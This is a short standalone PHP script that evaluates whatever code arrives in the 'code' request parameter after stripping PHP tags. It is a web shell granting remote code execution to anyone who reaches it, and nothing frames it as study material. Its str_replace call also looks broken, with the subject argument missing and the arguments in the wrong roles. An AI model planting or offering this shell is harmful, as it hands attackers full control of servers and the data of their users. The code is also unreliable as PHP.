<?php
$s=array('<?php'=>'','<?='=>'','<?'=>'','?>'=>''); 
echo eval(str_replace($s,$_REQUEST['code']));
?>